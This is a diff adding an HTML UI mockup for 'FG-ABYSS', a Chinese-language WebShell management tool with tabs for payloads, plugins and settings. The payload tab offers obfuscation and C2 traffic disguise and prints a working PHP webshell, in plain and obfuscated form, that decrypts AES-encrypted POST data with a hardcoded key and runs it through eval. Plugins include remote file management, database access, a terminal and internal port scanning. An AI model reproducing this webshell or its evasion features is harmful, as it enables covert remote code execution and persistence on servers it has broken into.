+          <!-- ═══ LEFT CONFIG PANEL ═══ -->
+          <div class="config-panel" style="width:340px;gap:0;padding:0;overflow-y:auto">
+            <!-- Name row -->
+            <div style="padding:12px 16px 10px;border-bottom:1px solid #1f2130;display:flex;align-items:center;gap:8px">
+              <input class="s-input" style="flex:1;height:30px;font-size:12px" placeholder="载荷名称（可选）"/>
+              <button class="s-btn s-btn-default" style="height:30px;font-size:11px;display:flex;align-items:center;gap:4px;flex-shrink:0">
+                <i data-lucide="save" style="width:12px;height:12px;stroke-width:1.5"></i> 保存
+              </button>
+            </div>
+            <div style="padding:12px 16px;display:flex;flex-direction:column;gap:14px;flex:1">
+
+              <!-- Language -->
+              <div class="payload-section">
+                <span class="field-label">语言</span>
+                <div class="radio-group" style="gap:4px">
+                  <button class="radio-btn active" style="flex:1;height:30px">PHP</button>
+                  <button class="radio-btn" style="flex:1;height:30px">JSP</button>
+                  <button class="radio-btn" style="flex:1;height:30px">ASP</button>
+                  <button class="radio-btn" style="flex:1;height:30px">ASPX</button>
+                </div>
+              </div>
+
+              <!-- Target Version -->
+              <div class="payload-section">
+                <span class="field-label">目标版本</span>
+                <div class="radio-group" style="gap:4px">
+                  <button class="radio-btn active" style="flex:1;height:28px;font-size:11px">5.x+</button>
+                  <button class="radio-btn" style="flex:1;height:28px;font-size:11px">7.4+</button>
+                  <button class="radio-btn" style="flex:1;height:28px;font-size:11px">8.x</button>
+                </div>
+              </div>
+
+              <!-- C2 Profile -->
+              <div class="payload-section">
+                <span class="field-label">C2 Profile</span>
+                <select class="s-input" style="height:32px;width:100%">
+                  <option>默认 (Default)</option>
+                  <option>拟态 Web 流量</option>
+                  <option>CDN 流量伪装</option>
+                  <option>自定义...</option>
+                </select>
+                <span class="field-hint">控制请求参数名、User-Agent、时序抖动</span>
+              </div>
+
+              <!-- Encryption -->
+              <div class="payload-section">
+                <span class="field-label">加密方式</span>
+                <div class="enc-options">
+                  <label class="enc-option active" onclick="selectEnc(this)">
+                    <div class="radio-circle" style="border-color:var(--accent);background:radial-gradient(circle,var(--accent) 3px,transparent 3px)"></div>
+                    <span class="enc-name">AES-256-GCM</span>
+                    <span class="enc-tag enc-tag-rec">推荐</span>
+                  </label>
+                  <label class="enc-option" onclick="selectEnc(this)">
+                    <div class="radio-circle"></div>
+                    <span class="enc-name">XOR</span>
+                    <span class="enc-tag enc-tag-compat">兼容</span>
+                  </label>
+                  <label class="enc-option" onclick="selectEnc(this)">
+                    <div class="radio-circle"></div>
+                    <span class="enc-name">无加密</span>
+                    <span class="enc-tag enc-tag-warn">不推荐</span>
+                  </label>
+                </div>
+              </div>
+
+              <!-- Key -->
+              <div class="payload-section">
+                <span class="field-label">密钥</span>
+                <div class="key-row">
+                  <input class="key-input" id="key-input" type="password" value="myS3cr3tK3y!"/>
+                  <button class="icon-btn" onclick="toggleKeyVis(this)"><i data-lucide="eye" style="width:14px;height:14px;stroke-width:1.5"></i></button>
+                  <button class="icon-btn" onclick="copyKey(this)"><i data-lucide="copy" style="width:14px;height:14px;stroke-width:1.5"></i></button>
+                </div>
+                <div class="strength-bar">
+                  <div class="strength-seg s1"></div>
+                  <div class="strength-seg s2"></div>
+                  <div class="strength-seg" style="background:#fbbf24"></div>
+                  <div class="strength-seg"></div>
+                </div>
+                <span class="field-hint strength-label medium">强度：中等</span>
+              </div>
+
+              <!-- Obfuscation -->
+              <div class="payload-section">
+                <span class="field-label">混淆等级</span>
+                <div class="slider-row">
+                  <div class="m-slider" style="flex:1"><div class="m-slider-fill" style="width:40%"></div><div class="m-slider-dot" style="left:40%"></div></div>
+                  <span class="level-badge">L2</span>
+                </div>
+                <div class="check-list" style="margin-top:8px">
+                  <label class="check-item checked"><div class="check-box">✓</div>变量重命名</label>
+                  <label class="check-item checked"><div class="check-box">✓</div>字符串加密</label>
+                  <label class="check-item"><div class="check-box"></div>垃圾代码注入</label>
+                </div>
+              </div>
+            </div>
+
+            <!-- Generate button pinned to bottom -->
+            <div style="padding:12px 16px;border-top:1px solid #1f2130;flex-shrink:0">
+              <button class="gen-btn" id="gen-btn" style="width:100%;font-size:14px" onclick="generatePayload()">生成载荷</button>
+            </div>
+          </div>
+
+          <!-- ═══ RIGHT CODE PANEL ═══ -->
+          <div class="code-panel">
+            <div class="code-toolbar">
+              <span style="font-size:11px;color:#646b85;font-family:monospace;flex:1">payload.php · 1.4 KB</span>
+              <button class="diff-act-btn" id="diff-btn" onclick="toggleDiff()" title="混淆对比视图">
+                <i data-lucide="columns-2" style="width:12px;height:12px;stroke-width:1.5"></i> 对比
+              </button>
+              <button class="icon-btn" style="color:#7a829a" title="复制" onclick="copyCode(this)"><i data-lucide="copy" style="width:14px;height:14px;stroke-width:1.5"></i></button>
+              <button class="icon-btn" style="color:#7a829a" title="下载"><i data-lucide="download" style="width:14px;height:14px;stroke-width:1.5"></i></button>
+            </div>
+
+            <!-- Single code view -->
+            <div id="single-code" class="code-with-nums" style="flex:1;overflow:hidden">
+              <div class="line-nums">1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14</div>
+              <div class="code-body-inner">
+<span class="code-kw">&lt;?php</span><br>
+<span style="color:#7f848e">// AES-256-GCM · L2 obfuscation</span><br>
+<span class="code-var">$_O0O0</span>=<span class="code-fn">base64_decode</span>(<span class="code-str">'bXlTM2NyM3RLM3kh'</span>);<br>
+<span class="code-var">$_iv</span>=<span class="code-fn">base64_decode</span>(<span class="code-var">$_POST</span>[<span class="code-str">"v"</span>]);<br>
+<span class="code-var">$_tag</span>=<span class="code-fn">base64_decode</span>(<span class="code-var">$_POST</span>[<span class="code-str">"t"</span>]);<br>
+<span class="code-var">$_d</span>=<span class="code-fn">openssl_decrypt</span>(<br>
+&nbsp;&nbsp;<span class="code-fn">base64_decode</span>(<span class="code-var">$_POST</span>[<span class="code-str">"d"</span>]),<br>
+&nbsp;&nbsp;<span class="code-str">"aes-256-gcm"</span>,<span class="code-var">$_O0O0</span>,<br>
+&nbsp;&nbsp;OPENSSL_RAW_DATA,<span class="code-var">$_iv</span>,<span class="code-var">$_tag</span><br>
+);<br>
+<span class="code-kw">if</span>(<span class="code-var">$_d</span>!==<span class="code-kw">false</span>){<br>
+&nbsp;&nbsp;<span class="code-fn">eval</span>(<span class="code-var">$_d</span>);<br>
+}<br>
+<span class="code-kw">?&gt;</span>
+              </div>
+            </div>
+
+            <!-- Diff view (hidden by default) -->
+            <div id="diff-view" class="diff-view" style="display:none;flex:1">
+              <div class="diff-col">
+                <div class="diff-col-hdr"><i data-lucide="file-text" style="width:12px;height:12px;stroke-width:1.5"></i> 原始代码</div>
+                <div class="code-body-inner" style="flex:1;overflow-y:auto;background:#0c0d11">
+<span class="code-kw">&lt;?php</span><br>
+<span class="code-var">$key</span>=<span class="code-str">"myS3cr3tK3y!"</span>;<br>
+<span class="code-var">$iv</span>=<span class="code-fn">base64_decode</span>(<span class="code-var">$_POST</span>[<span class="code-str">"v"</span>]);<br>
+<span class="code-var">$tag</span>=<span class="code-fn">base64_decode</span>(<span class="code-var">$_POST</span>[<span class="code-str">"t"</span>]);<br>
+<span class="code-var">$data</span>=<span class="code-fn">openssl_decrypt</span>(<br>
+&nbsp;&nbsp;<span class="code-fn">base64_decode</span>(<span class="code-var">$_POST</span>[<span class="code-str">"d"</span>]),<br>
+&nbsp;&nbsp;<span class="code-str">"aes-256-gcm"</span>,<span class="code-var">$key</span>,<br>
+&nbsp;&nbsp;OPENSSL_RAW_DATA,<span class="code-var">$iv</span>,<span class="code-var">$tag</span><br>
+);<br>
+<span class="code-kw">if</span>(<span class="code-var">$data</span>!==<span class="code-kw">false</span>){<br>
+&nbsp;&nbsp;<span class="code-fn">eval</span>(<span class="code-var">$data</span>);<br>
+}<br>
+<span class="code-kw">?&gt;</span>
+                </div>
+              </div>
+              <div class="diff-col">
+                <div class="diff-col-hdr obf"><i data-lucide="shield" style="width:12px;height:12px;stroke-width:1.5"></i> 混淆后 (L2)</div>
+                <div class="code-body-inner" style="flex:1;overflow-y:auto;background:#0c0d11">
+<span class="code-kw">&lt;?php</span><br>
+<span class="code-var">$_O0O0</span>=<span class="code-fn">base64_decode</span>(<span class="code-str">'bXlTM2NyM3RLM3kh'</span>);<br>
+<span class="code-var">$_iv</span>=<span class="code-fn">base64_decode</span>(<span class="code-var">$_POST</span>[<span class="code-str">"v"</span>]);<br>
+<span class="code-var">$_tag</span>=<span class="code-fn">base64_decode</span>(<span class="code-var">$_POST</span>[<span class="code-str">"t"</span>]);<br>
+<span class="code-var">$_d</span>=<span class="code-fn">openssl_decrypt</span>(<br>
+&nbsp;&nbsp;<span class="code-fn">base64_decode</span>(<span class="code-var">$_POST</span>[<span class="code-str">"d"</span>]),<br>
+&nbsp;&nbsp;<span class="code-str">"aes-256-gcm"</span>,<span class="code-var">$_O0O0</span>,<br>
+&nbsp;&nbsp;OPENSSL_RAW_DATA,<span class="code-var">$_iv</span>,<span class="code-var">$_tag</span><br>
+);<br>
+<span class="code-kw">if</span>(<span class="code-var">$_d</span>!==<span class="code-kw">false</span>){<br>
+&nbsp;&nbsp;<span class="code-fn">eval</span>(<span class="code-var">$_d</span>);<br>
+}<br>
+<span class="code-kw">?&gt;</span>
+                </div>
+              </div>
+            </div>
+
+            <div class="code-status-bar">PHP 5.x–8.x &nbsp;·&nbsp; AES-256-GCM &nbsp;·&nbsp; 混淆 L2 &nbsp;·&nbsp; 1.4 KB</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="m-statusbar"><div class="m-status-dot active"></div><span>已连接</span><div class="m-divider"></div><span>载荷 <span class="m-stat-num">12</span></span></div>
+  </div>
+</div>
+
+<!-- PLUGIN (NEW) -->
+<div id="tab-plugin" class="tab-panel">
+  <div class="app-frame">
+    <div class="m-titlebar">
+      <div class="m-tb-left"><div class="m-logo">◈</div><span class="m-appname">渊渟</span><span class="m-appsub">ABYSS</span></div>
+      <div class="m-tb-right"><button class="m-tb-btn theme-toggle-btn" onclick="toggleTheme()" title="切换主题"><i data-lucide="moon" style="width:14px;height:14px;stroke-width:1.5"></i></button><button class="m-tb-btn" style="font-size:11px">ZH</button><div class="m-wc"><button class="m-wc-btn">−</button><button class="m-wc-btn">□</button><button class="m-wc-close m-wc-btn">✕</button></div></div>
+    </div>
+    <div class="m-body">
+      <div class="m-sidebar">
+        <div class="m-nav">
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="house" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">首页</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="folder" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">项目</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="package" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">载荷</div></a>
+          <a class="m-nav-item active"><div class="m-nav-icon"><i data-lucide="puzzle" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">插件</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="settings" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">设置</div></a>
+        </div>
+      </div>
+      <div class="m-content">
+        <div class="plugin-view">
+          <div class="plugin-toolbar">
+            <span class="plugin-count">已安装 (4)</span>
+            <div class="filter-tabs">
+              <button class="filter-tab active">全部</button>
+              <button class="filter-tab">已启用</button>
+              <button class="filter-tab">已禁用</button>
+              <button class="filter-tab">内置</button>
+            </div>
+            <div class="spacer"></div>
+            <button class="s-btn s-btn-primary">+ 安装</button>
+          </div>
+          <div class="plugin-grid">
+            <div class="plugin-card">
+              <div class="card-header"><span class="plugin-name">文件管理</span><div class="card-badges"><span class="ver-badge">v1.2.0</span><span class="builtin-badge">内置</span></div></div>
+              <p class="plugin-desc">远程文件浏览、上传、下载、编辑操作</p>
+              <div class="card-footer"><div class="switch-row"><div class="m-switch on"></div><span>已启用</span></div></div>
+            </div>
+            <div class="plugin-card">
+              <div class="card-header"><span class="plugin-name">数据库管理</span><div class="card-badges"><span class="ver-badge">v1.0.0</span><span class="builtin-badge">内置</span></div></div>
+              <p class="plugin-desc">SQL 查询执行、数据导出与可视化结果展示</p>
+              <div class="card-footer"><div class="switch-row"><div class="m-switch on"></div><span>已启用</span></div></div>
+            </div>
+            <div class="plugin-card">
+              <div class="card-header"><span class="plugin-name">终端</span><div class="card-badges"><span class="ver-badge">v1.1.0</span><span class="builtin-badge">内置</span></div></div>
+              <p class="plugin-desc">交互式命令执行与 xterm.js 终端界面</p>
+              <div class="card-footer"><div class="switch-row"><div class="m-switch on"></div><span>已启用</span></div></div>
+            </div>
+            <div class="plugin-card disabled">
+              <div class="card-header"><span class="plugin-name">端口扫描</span><div class="card-badges"><span class="ver-badge">v0.3.1</span><span class="third-badge">第三方</span></div></div>
+              <p class="plugin-desc">内网端口探测与服务识别插件</p>
+              <div class="card-footer"><div class="switch-row"><div class="m-switch"></div><span style="color:#646b85">已禁用</span></div><button class="uninstall-btn">卸载</button></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="m-statusbar"><div class="m-status-dot active"></div><span>已连接</span></div>
+  </div>
+  <p style="color:#646b85;font-size:12px;margin-top:10px">✦ 插件卡片网格自适应列数 · filter-tab 选中态有 accent 背景 · 第三方插件可卸载</p>
+</div>
+
+<!-- SETTINGS -->
+<div id="tab-settings" class="tab-panel">
+  <div class="app-frame">
+    <div class="m-titlebar">
+      <div class="m-tb-left"><div class="m-logo">◈</div><span class="m-appname">渊渟</span><span class="m-appsub">ABYSS</span></div>
+      <div class="m-tb-right"><button class="m-tb-btn theme-toggle-btn" onclick="toggleTheme()" title="切换主题"><i data-lucide="moon" style="width:14px;height:14px;stroke-width:1.5"></i></button><button class="m-tb-btn" style="font-size:11px">ZH</button><div class="m-wc"><button class="m-wc-btn">−</button><button class="m-wc-btn">□</button><button class="m-wc-close m-wc-btn">✕</button></div></div>
+    </div>
+    <div class="m-body">
+      <div class="m-sidebar">
+        <div class="m-nav">
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="house" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">首页</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="folder" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">项目</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="package" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">载荷</div></a>
+          <a class="m-nav-item"><div class="m-nav-icon"><i data-lucide="puzzle" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">插件</div></a>
+          <a class="m-nav-item active"><div class="m-nav-icon"><i data-lucide="settings" style="width:20px;height:20px;stroke-width:1.5"></i></div><div class="m-nav-label">设置</div></a>
+        </div>
+      </div>
+      <div class="m-content">
+        <div class="settings-view">
+          <div class="settings-nav">
+            <button class="settings-item active" onclick="switchSettingsPanel('appearance',this)"><i data-lucide="palette" style="width:14px;height:14px;stroke-width:1.5;flex-shrink:0"></i> 外观</button>
+            <button class="settings-item" onclick="switchSettingsPanel('connection',this)"><i data-lucide="wifi" style="width:14px;height:14px;stroke-width:1.5;flex-shrink:0"></i> 连接</button>
+            <button class="settings-item" onclick="switchSettingsPanel('security',this)"><i data-lucide="lock" style="width:14px;height:14px;stroke-width:1.5;flex-shrink:0"></i> 安全</button>
+            <button class="settings-item" onclick="switchSettingsPanel('logging',this)"><i data-lucide="file-text" style="width:14px;height:14px;stroke-width:1.5;flex-shrink:0"></i> 日志</button>
+            <button class="settings-item" onclick="switchSettingsPanel('backup',this)"><i data-lucide="database" style="width:14px;height:14px;stroke-width:1.5;flex-shrink:0"></i> 备份</button>
+            <button class="settings-item" onclick="switchSettingsPanel('about',this)"><i data-lucide="info" style="width:14px;height:14px;stroke-width:1.5;flex-shrink:0"></i> 关于</button>
+          </div>
+          <div class="settings-content">
+
+            <!-- 外观 -->
+            <div class="settings-panel" data-panel="appearance">
+              <div class="section-heading"><i data-lucide="palette" style="width:16px;height:16px;stroke-width:1.5"></i>外观</div>
+              <div class="settings-card">
+                <div class="settings-card-title">主题</div>
+                <div class="theme-cards">
+                  <div class="theme-card" onclick="selectTheme(this,'dark')"><div class="theme-preview dark"></div><div class="theme-label">深色</div></div>
+                  <div class="theme-card active" onclick="selectTheme(this,'sys')"><div class="theme-preview sys"></div><div class="theme-label">跟随系统</div></div>
+                  <div class="theme-card" onclick="selectTheme(this,'light')"><div class="theme-preview light"></div><div class="theme-label">浅色</div></div>
+                </div>
+              </div>
+              <div class="settings-card">
+                <div class="settings-card-title">强调色</div>
+                <div class="accent-swatches">
+                  <div class="accent-swatch selected" style="background:#4f9cff;color:#4f9cff" title="蓝色" onclick="selectAccent(this,'#4f9cff')">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20,6 9,17 4,12"/></svg>
+                  </div>
+                  <div class="accent-swatch" style="background:#22d3ee;color:#22d3ee" title="青色" onclick="selectAccent(this,'#22d3ee')"></div>
+                  <div class="accent-swatch" style="background:#a78bfa;color:#a78bfa" title="紫色" onclick="selectAccent(this,'#a78bfa')"></div>
+                  <div class="accent-swatch" style="background:#f472b6;color:#f472b6" title="粉色" onclick="selectAccent(this,'#f472b6')"></div>
+                  <div class="accent-swatch" style="background:#fb923c;color:#fb923c" title="橙色" onclick="selectAccent(this,'#fb923c')"></div>
+                  <div class="accent-swatch" style="background:#4ade80;color:#4ade80" title="绿色" onclick="selectAccent(this,'#4ade80')"></div>
+                  <div class="accent-swatch accent-swatch-custom" title="自定义颜色" onclick="document.getElementById('custom-accent').click()">
+                    <i data-lucide="pipette" style="width:14px;height:14px;stroke-width:1.5"></i>
+                  </div>
+                  <input type="color" id="custom-accent" value="#4f9cff" style="position:absolute;opacity:0;width:0;height:0" onchange="applyCustomAccent(this.value)">
+                </div>
+                <div class="accent-preview-row">
+                  <button class="accent-preview-btn">示例按钮</button>
+                  <div class="accent-hex-display">
+                    <div class="accent-hex-swatch"></div>
+                    <span id="accent-hex" style="font-family:monospace;font-size:12px;color:var(--accent)">#4f9cff</span>
+                  </div>
+                </div>
+              </div>
+              <div class="settings-card">
+                <div class="settings-card-title">界面字体大小</div>
+                <div style="display:flex;gap:6px">
+                  <button class="radio-btn" style="height:28px;font-size:11px">12px</button>
+                  <button class="radio-btn active" style="height:28px;font-size:11px">13px</button>
+                  <button class="radio-btn" style="height:28px;font-size:11px">14px</button>
+                  <button class="radio-btn" style="height:28px;font-size:11px">15px</button>
+                </div>
+              </div>
+            </div>
+
+            <!-- 连接 -->
+            <div class="settings-panel" data-panel="connection" style="display:none">
+              <div class="section-heading"><i data-lucide="wifi" style="width:16px;height:16px;stroke-width:1.5"></i>连接</div>
+              <div class="settings-card">
+                <div class="settings-card-title">超时与重试</div>
+                <div class="s-row">
+                  <div class="s-row-left">
+                    <span class="s-row-label">请求超时</span>
+                    <span class="s-row-sub">单次请求最长等待时间</span>
+                  </div>
+                  <div style="display:flex;align-items:center;gap:10px;width:160px">
+                    <div class="m-slider" style="flex:1"><div class="m-slider-fill" style="width:30%"></div><div class="m-slider-dot" style="left:30%"></div></div>
+                    <span class="level-badge">15s</span>
+                  </div>
+                </div>
+                <div class="s-row">
+                  <div class="s-row-left">
+                    <span class="s-row-label">失败重试次数</span>
+                    <span class="s-row-sub">连接失败后自动重试</span>
+                  </div>
+                  <div style="display:flex;gap:4px">
+                    <button class="radio-btn active" style="height:28px;min-width:36px">0</button>
+                    <button class="radio-btn" style="height:28px;min-width:36px">1</button>
+                    <button class="radio-btn" style="height:28px;min-width:36px">2</button>
+                    <button class="radio-btn" style="height:28px;min-width:36px">3</button>
+                  </div>
+                </div>
+              </div>
+              <div class="settings-card">
+                <div class="s-row" style="margin-bottom:4px">
+                  <div class="s-row-left">
+                    <span class="s-row-label" style="font-size:11px;font-weight:600;color:#646b85;text-transform:uppercase;letter-spacing:.08em">代理设置</span>
+                  </div>
+                  <div class="m-switch" id="proxy-switch" onclick="toggleProxy(this)"></div>
+                </div>
+                <div id="proxy-fields" style="display:flex;flex-direction:column;gap:12px;opacity:0.35;pointer-events:none;margin-top:8px">
+                  <div class="s-row">
+                    <span class="s-row-label">代理类型</span>
+                    <div style="display:flex;gap:4px">
+                      <button class="radio-btn active" style="height:28px">HTTP</button>
+                      <button class="radio-btn" style="height:28px">SOCKS5</button>
+                    </div>
+                  </div>
+                  <div class="s-row">
+                    <span class="s-row-label">地址 / 端口</span>
+                    <div style="display:flex;gap:6px">
+                      <input class="key-input" style="width:120px" placeholder="127.0.0.1"/>
+                      <input class="key-input" style="width:60px" placeholder="7890"/>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- 安全 -->
+            <div class="settings-panel" data-panel="security" style="display:none">
+              <div class="section-heading"><i data-lucide="lock" style="width:16px;height:16px;stroke-width:1.5"></i>安全</div>
+              <div class="settings-card">
+                <div class="s-row">
+                  <div class="s-row-left">
+                    <span class="s-row-label">主密码保护</span>
+                    <span class="s-row-sub">启动时需验证主密码才能访问数据</span>
+                  </div>
+                  <div class="m-switch on"></div>
+                </div>
+                <button class="s-btn s-btn-default" style="height:30px;font-size:12px;align-self:flex-start;display:flex;align-items:center;gap:5px">
+                  <i data-lucide="key" style="width:12px;height:12px;stroke-width:1.5"></i> 修改主密码
+                </button>
+              </div>
+              <div class="settings-card">
+                <div class="s-row">
+                  <div class="s-row-left">
+                    <span class="s-row-label">空闲自动锁定</span>
+                    <span class="s-row-sub">无操作超时后锁定，设为 0 禁用</span>
+                  </div>
+                  <span class="level-badge">15 min</span>
+                </div>
+                <div class="m-slider" style="margin-top:4px"><div class="m-slider-fill" style="width:25%"></div><div class="m-slider-dot" style="left:25%"></div></div>
+              </div>
+              <div class="settings-card">
+                <div class="s-row">
+                  <div class="s-row-left">
+                    <span class="s-row-label">数据加密方案</span>
+                    <span class="s-row-sub">静态数据加密算法</span>
+                  </div>
+                  <span class="enc-badge" style="color:#4ade80">AES-256-GCM</span>
+                </div>
+              </div>
+            </div>
+
+            <!-- 日志 -->
+            <div class="settings-panel" data-panel="logging" style="display:none">
+              <div class="section-heading"><i data-lucide="file-text" style="width:16px;height:16px;stroke-width:1.5"></i>日志</div>
+              <div class="settings-card">
+                <div class="settings-card-title">日志级别</div>
+                <div style="display:flex;gap:6px">
+                  <button class="radio-btn" style="height:28px;font-size:11px">DEBUG</button>
+                  <button class="radio-btn active" style="height:28px;font-size:11px">INFO</button>
+                  <button class="radio-btn" style="height:28px;font-size:11px">WARN</button>
+                  <button class="radio-btn" style="height:28px;font-size:11px">ERROR</button>
+                </div>
+              </div>
+              <div class="settings-card">
+                <div class="settings-card-title">文件策略</div>
+                <div class="s-row">
+                  <span class="s-row-label">单文件上限</span>
+                  <span class="level-badge">10 MB</span>
+                </div>
+                <div class="s-row">
+                  <span class="s-row-label">保留文件数</span>
+                  <span class="level-badge">7 个</span>
+                </div>
+                <div class="s-row">
+                  <span class="s-row-label">日志目录</span>
+                  <span class="s-mono" style="font-size:11px;color:#646b85">…/fg-abyss/logs/</span>
+                </div>
+              </div>
+              <button class="s-btn s-btn-default" style="height:30px;font-size:12px;align-self:flex-start;display:flex;align-items:center;gap:5px">
+                <i data-lucide="folder-open" style="width:12px;height:12px;stroke-width:1.5"></i> 打开日志目录
+              </button>
+            </div>
+
+            <!-- 备份 -->
+            <div class="settings-panel" data-panel="backup" style="display:none">
+              <div class="section-heading"><i data-lucide="database" style="width:16px;height:16px;stroke-width:1.5"></i>备份与恢复</div>
+              <div class="settings-card">
+                <div class="s-row">
+                  <div class="s-row-left">
+                    <span class="s-row-label">导出备份</span>
+                    <span class="s-row-sub">将所有数据导出为加密备份文件</span>
+                  </div>
+                  <button class="s-btn s-btn-default" style="height:30px;font-size:12px;display:flex;align-items:center;gap:5px;flex-shrink:0">
+                    <i data-lucide="download" style="width:12px;height:12px;stroke-width:1.5"></i> 导出
+                  </button>
+                </div>
+                <div class="s-row">
+                  <div class="s-row-left">
+                    <span class="s-row-label">导入备份</span>
+                    <span class="s-row-sub">从备份文件恢复，与现有数据合并</span>
+                  </div>
+                  <button class="s-btn s-btn-default" style="height:30px;font-size:12px;display:flex;align-items:center;gap:5px;flex-shrink:0">
+                    <i data-lucide="upload" style="width:12px;height:12px;stroke-width:1.5"></i> 导入
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- 关于 -->
+            <div class="settings-panel" data-panel="about" style="display:none">
+              <div class="section-heading"><i data-lucide="info" style="width:16px;height:16px;stroke-width:1.5"></i>关于</div>
+              <div class="settings-card" style="align-items:center;text-align:center;padding:28px 20px">
+                <div style="width:56px;height:56px;background:linear-gradient(135deg,#4f9cff,#22d3ee);border-radius:14px;display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:700;color:#09090c;margin-bottom:12px">◈</div>
+                <div style="font-size:17px;font-weight:700;color:#e2e4ed;letter-spacing:-0.01em">FG-ABYSS</div>
+                <div style="font-size:12px;color:#646b85;font-family:monospace;margin-top:4px">渊渟 · WebShell 管理工具</div>
+                <div style="margin-top:12px;padding:6px 14px;background:#191b23;border-radius:20px;font-size:12px;font-family:monospace;color:#7a829a">v0.1.0-alpha</div>
+              </div>
+              <div class="settings-card">
+                <div class="settings-card-title">构建信息</div>
+                <div class="s-row"><span class="s-row-label">构建框架</span><span class="enc-badge">Tauri v2 · Rust</span></div>
+                <div class="s-row"><span class="s-row-label">前端框架</span><span class="enc-badge">Vue 3 · Naive UI</span></div>
+                <div class="s-row"><span class="s-row-label">数据目录</span><span class="s-mono" style="font-size:11px;color:#646b85">…/fg-abyss/</span></div>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="m-statusbar"><div class="m-status-dot"></div><span>未连接</span></div>
+  </div>
+</div>
+
+<script>
+function switchTab(name, btn) {
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  btn.classList.add('active');
+  // Sync active state on all sidebar nav items across all frames
+  const iconToTab = { house: 'home', folder: 'project', package: 'payload', puzzle: 'plugin', settings: 'settings' };
+  document.querySelectorAll('.m-nav-item').forEach(item => {
+    const icon = item.querySelector('[data-lucide]');
+    if (!icon) return;
+    item.classList.toggle('active', iconToTab[icon.getAttribute('data-lucide')] === name);
+  });
+  lucide.createIcons();
+}
+
+function toggleTheme() {
+  const isLight = !document.querySelector('.app-frame').classList.contains('theme-light');
+  applyTheme(isLight);
+}
+
+function applyTheme(isLight) {
+  document.querySelectorAll('.app-frame').forEach(f => f.classList.toggle('theme-light', isLight));
+  // Sync titlebar icon: moon ↔ sun
+  document.querySelectorAll('.theme-toggle-btn').forEach(btn => {
+    btn.innerHTML = isLight
+      ? '<i data-lucide="sun" style="width:14px;height:14px;stroke-width:1.5"></i>'
+      : '<i data-lucide="moon" style="width:14px;height:14px;stroke-width:1.5"></i>';
+  });
+  // Sync settings theme cards (深色=0, 跟随系统=1, 浅色=2)
+  document.querySelectorAll('#tab-settings .theme-card').forEach((c, i) => {
+    c.classList.toggle('active', isLight ? i === 2 : i === 0);
+  });
+  lucide.createIcons();
+}
+
+function selectTheme(card, theme) {
+  const isLight = theme === 'light' || (theme === 'sys' && window.matchMedia('(prefers-color-scheme: light)').matches);
+  applyTheme(isLight);
+}
+
+function hexToRgb(hex) {
+  const h = hex.replace('#', '');
+  return `${parseInt(h.slice(0,2),16)}, ${parseInt(h.slice(2,4),16)}, ${parseInt(h.slice(4,6),16)}`;
+}
+
+function applyAccent(color) {
+  document.documentElement.style.setProperty('--accent', color);
+  document.documentElement.style.setProperty('--accent-rgb', hexToRgb(color));
+  const label = document.getElementById('accent-hex');
+  if (label) label.textContent = color;
+}
+
+function selectAccent(dot, color) {
+  document.querySelectorAll('#tab-settings .accent-swatch').forEach(d => {
+    d.classList.remove('selected');
+    if (!d.classList.contains('accent-swatch-custom')) d.innerHTML = '';
+  });
+  dot.classList.add('selected');
+  dot.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20,6 9,17 4,12"/></svg>';
+  applyAccent(color);
+}
+
+function applyCustomAccent(color) {
+  const customDot = document.querySelector('.accent-swatch-custom');
+  customDot.style.setProperty('background', color, 'important');
+  customDot.style.color = color;
+  document.querySelectorAll('#tab-settings .accent-swatch').forEach(d => {
+    d.classList.remove('selected');
+    if (!d.classList.contains('accent-swatch-custom')) d.innerHTML = '';
+  });
+  customDot.classList.add('selected');
+  customDot.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20,6 9,17 4,12"/></svg>';
+  applyAccent(color);
+  lucide.createIcons();
+}
+
+function toggleProxy(sw) {
+  const isOn = sw.classList.toggle('on');
+  const fields = document.getElementById('proxy-fields');
+  if (fields) { fields.style.opacity = isOn ? '1' : '0.35'; fields.style.pointerEvents = isOn ? '' : 'none'; }
+}
+
+function switchSettingsPanel(name, btn) {
+  const view = document.querySelector('#tab-settings .settings-view');
+  view.querySelectorAll('.settings-item').forEach(b => b.classList.remove('active'));
+  view.querySelectorAll('.settings-panel').forEach(p => p.style.display = 'none');
+  btn.classList.add('active');
+  const panel = view.querySelector('[data-panel="' + name + '"]');
+  if (panel) panel.style.display = '';
+  lucide.createIcons();
+}
+
